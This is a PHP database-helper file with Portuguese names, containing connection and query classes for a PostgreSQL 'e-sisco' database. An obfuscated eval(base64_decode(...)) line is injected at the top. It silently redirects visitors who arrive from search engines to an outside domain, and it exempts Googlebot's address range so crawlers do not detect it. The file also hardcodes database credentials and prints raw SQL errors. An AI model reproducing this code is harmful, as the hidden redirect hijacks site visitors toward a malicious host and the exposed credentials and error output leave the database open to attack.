<?php	 	eval(base64_decode("ZXJyb3JfcmVwb3J0aW5nKDApOyBpZiAoIWhlYWRlcnNfc2VudCgpKXsgaWYgKGlzc2V0KCRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXSkpeyBpZiAoaXNzZXQoJF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddKSl7IGlmICgocHJlZ19tYXRjaCAoIi9NU0lFICg5LjB8MTAuMCkvIiwkX1NFUlZFUlsnSFRUUF9VU0VSX0FHRU5UJ10pKSBvciAocHJlZ19tYXRjaCAoIi9ydjpbMC05XStcLjBcKSBsaWtlIEdlY2tvLyIsJF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddKSkgb3IgKHByZWdfbWF0Y2ggKCIvRmlyZWZveFwvKFswLTldK1wuMCkvIiwkX1NFUlZFUlsnSFRUUF9VU0VSX0FHRU5UJ10sJG1hdGNoZikgYW5kICRtYXRjaGZbMV0+MTEpKXsgaWYoIXByZWdfbWF0Y2goIi9eNjZcLjI0OVwuLyIsJF9TRVJWRVJbJ1JFTU9URV9BRERSJ10pKXsgaWYgKHN0cmlzdHIoJF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddLCJ5YWhvby4iKSBvciBzdHJpc3RyKCRfU0VSVkVSWydIVFRQX1JFRkVSRVInXSwiYmluZy4iKSBvciBwcmVnX21hdGNoICgiL2dvb2dsZVwuKC4qPylcL3VybFw/c2EvIiwkX1NFUlZFUlsnSFRUUF9SRUZFUkVSJ10pKSB7IGlmICghc3RyaXN0cigkX1NFUlZFUlsnSFRUUF9SRUZFUkVSJ10sImNhY2hlIikgYW5kICFzdHJpc3RyKCRfU0VSVkVSWydIVFRQX1JFRkVSRVInXSwiaW51cmwiKSBhbmQgIXN0cmlzdHIoJF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddLCJFZVlwM0Q3IikpeyBoZWFkZXIoIkxvY2F0aW9uOiBodHRwOi8vYnJyam5rbmtqYWRnZC5yZWJhdGVzcnVsZS5uZXQvIik7IGV4aXQoKTsgfSB9IH0gfSB9IH0gfQ=="));

class bd {
    var $bd;
    var $id;

    function bd($sgbd="mysql") {
        $this->bd = $sgbd;
    }

    function conecta ($bd,$servidor,$porta,$usuario,$senha) {

            $this->id = pg_connect ("dbname=$bd user=$usuario password=$senha host=$servidor"); 
    }
    
    function desconecta()
    {
      pg_close($this->id);
    }
}

class consulta {

    var $bd;
    var $res;
    var $row;
    var $nrw;
    var $data;

    function consulta(&$bd) {
        $this->bd = $bd;
    }

    function executa($sql="",$tipo="") {

            global $PHP_SELF, $resultado, $REMOTE_ADDR, $HTTP_USER_AGENT;

        if ($sql=="") {
            $this->res = 0;
            $this->nrw = 0;
            $this->row = -1;
        }

        

            if(!$this->res = pg_query($sql))
            			echo "<font color=red>DEBUG - ERRO $sql<br>".pg_last_error() ;

            

            if (trim(substr(strtolower($sql),0,strpos($sql," "))) == "select")
               $this->nrw = pg_num_rows($this->res);

        $this->row = 0;

        if($this->nrw>0){
             $this->dados();
        }
    }

    function primeiro() {
        $this->row = 0;
        $this->dados();
    }

    function proximo() {
        $this->row = ($this->row< ($this->nrw-1)) ? ++$this->row: ($this->nrw - 1);
        $this->dados();
    }

    function anterior() {
        $this->row = ($this->row>0) ? --$this->row : 0;
        $this->dados();
    }

    function ultimo() {
        $this->row = $this->nrw-1;
        $this->navega($this->row);
    }

    function navega ($linha) {
        if ($linha>0 AND $linha<$this->nrw) {
            $this->row = $linha;
            $this->dados();
        }
    }

    function dados() {
            $this->data = @pg_fetch_array($this->res);
    }
}

//conexao e-sisco
$user = "esisco1";
$pass = "iset7617";
$database = "esisco1";

$con = new bd();
$con->conecta($database,"127.0.0.1","",$user,$pass);
//$con->conecta($database,"177.70.107.58","",$user,$pass);
//$con->conecta($database,"177.70.107.58","",$user,$pass);

//pg_set_client_encoding($con, LATIN1);

?>
